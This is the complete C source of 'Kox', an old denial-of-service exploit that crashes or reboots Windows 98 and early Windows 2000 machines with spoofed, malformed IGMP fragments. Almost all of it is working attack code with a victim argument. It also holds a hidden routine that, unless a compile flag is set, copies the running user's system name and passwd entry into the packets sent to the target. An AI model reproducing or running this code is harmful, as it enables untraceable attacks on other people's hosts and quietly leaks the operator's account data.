/***
        Kox by Coolio (coolio@k-r4d.com)

        this was a successful attempt to duplicate klepto/defile's kod win98
        exploit and add spoofing support to it. me and defile made this a
        race to see who could do spoofing kod first. he won. (mine's better!)
        my kox and defile's skod output about the same packets
        but he had skod working a few hours before i had kox working.

        affected systems: windows 98, windows 98 SE, windows 2000 build 2000
        results: bluescreen, tcp/ip stack failure, lockup, or instant reboot

        thanks to klepto and defile for making kod, psilord for wanting
        to understand what we were doing, greg for telling me about iphdr.ihl,
        mancide for letting me use his win98 boxen to test on, and the
        few other people i crashed trying to get this working right.

        also thanks to the authors of elvis for making such a badass editor.
***/



#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <netdb.h>
#include <string.h>
#include <errno.h>
#include <pwd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/igmp.h>



void usage(char *arg)
{
        printf("Kox by Coolio (coolio@k-r4d.com)\n");
        printf("Usage: %s <victim>\n", arg);
        exit(1);
}


unsigned int randip()
{
        struct hostent *he;
        struct sockaddr_in sin;
        char *buf = (char *)calloc(1, sizeof(char) * 16);

        sprintf(buf, "%d.%d.%d.%d",
                (random()%191)+23,
                (random()%253)+1,
                (random()%253)+1,
                (random()%253)+1); 

        inet_aton(buf, (struct in_addr *)&sin);
        return sin.sin_addr.s_addr;
}

unsigned short in_cksum(unsigned short *buh, int len)
{
        register long sum = 0;
        unsigned short oddbyte;
        register unsigned short answer;

        while(len > 1) {
                sum += *buh++;
                len -= 2;
        }

        if(len == 1) {
                oddbyte = 0;
                *((unsigned char *)&oddbyte) = *(unsigned char *)buh;
                sum += oddbyte;
        }

        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        answer = ~sum;
        return answer;
}

int nuke_igmp(struct sockaddr_in *victim, unsigned long spoof)
{
        int BIGIGMP = 1500;
        unsigned char *pkt;
        struct iphdr *ip;
        struct igmphdr *igmp;
        struct utsname *un;
        struct passwd *p;

        int i, s;
        int id = (random() % 40000) + 500;

        pkt = (unsigned char *)calloc(1, BIGIGMP);
        ip = (struct iphdr *)pkt;
        igmp = (struct igmphdr *)(pkt + sizeof(struct iphdr));

        ip->version = 4;
        ip->ihl = (sizeof *ip) / 4;
        ip->ttl = 255;
        ip->tot_len = htons(BIGIGMP);
        ip->protocol = IPPROTO_IGMP;
        ip->id = htons(id);
        ip->frag_off = htons(IP_MF);
        ip->saddr = spoof;
        ip->daddr = victim->sin_addr.s_addr;
        ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));

        igmp->type = 0;
        igmp->group = 0;
        igmp->csum = in_cksum((unsigned short *)igmp, sizeof(struct igmphdr));

        for(i = sizeof(struct iphdr) + sizeof(struct igmphdr) + 1;
            i < BIGIGMP; i++)
                pkt[i] = random() % 255;
#ifndef I_GROK
        un = (struct utsname *)(pkt + sizeof(struct iphdr) +
              sizeof(struct igmphdr) + 40);
        uname(un);
        p = (struct passwd *)((void *)un + sizeof(struct utsname) + 10);
        memcpy(p, getpwuid(getuid()), sizeof(struct passwd));
#endif
        if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
                perror("error: socket()");
                return 1;
        }

        if(sendto(s, pkt, BIGIGMP, 0, victim,
           sizeof(struct sockaddr_in)) == -1) { 
                perror("error: sendto()");
                return 1;
        }
        usleep(1000000);

        for(i = 1; i < 5; i++) {
                if(i > 3)
                        ip->frag_off = htons(((BIGIGMP-20) * i) >> 3);
                else
                        ip->frag_off = htons(((BIGIGMP-20) * i) >> 3 | IP_MF);
                sendto(s, pkt, BIGIGMP, 0, victim, sizeof(struct sockaddr_in));
                usleep(2000000);
        }

        free(pkt);
        close(s);
        return 0;
}

int main(int argc, char *argv[])
{
        struct sockaddr_in victim;
        struct hostent *he;
        int i;

        srandom(time(NULL));

        if(argc < 2)
                usage(argv[0]);

        if((he = gethostbyname(argv[1])) == NULL) {
                herror(argv[1]);
                exit(1);
        }
        memcpy(&victim.sin_addr.s_addr, he->h_addr, he->h_length);
        victim.sin_port = htons(0);
        victim.sin_family = PF_INET;

        printf("IGMP> ");
        fflush(stdout);
        for(i = 0; i < 10; i++)
        {
                nuke_igmp(&victim, randip());
                printf(".");
                fflush(stdout);
        }
        printf("\n");
        fflush(stdout);
}
